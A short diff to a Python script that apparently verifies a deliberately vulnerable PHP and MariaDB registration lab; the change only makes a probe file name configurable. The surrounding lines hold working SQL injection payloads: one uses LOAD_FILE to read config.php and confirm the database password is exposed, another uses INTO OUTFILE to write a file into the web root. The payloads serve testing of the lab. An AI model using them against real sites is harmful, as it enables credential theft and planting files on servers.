@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """Outside-in functional verification of real PHP, MariaDB and registration flow."""
 import hashlib
+import os
 import html
 import http.cookiejar
 import re
@@ -58,7 +59,7 @@ source = register("Belgium' UNION SELECT LOAD_FILE('/var/www/html/config.php')--
 assert "$password" in source and "new mysqli" in source
 print("PASS: real PHP runtime configuration readable through database FILE privilege", flush=True)
 
-file_name = "validation-probe-" + secrets.token_hex(5) + ".txt"
+file_name = os.environ.get("VALIDATION_TEST_FILENAME", "validation-probe-ci.txt")
 plain_text = "validation-into-outfile-" + secrets.token_hex(4)
 value = plain_text.encode().hex()
 register("Belgium' UNION SELECT 0x" + value + " INTO OUTFILE '/var/www/html/" + file_name + "'-- -")
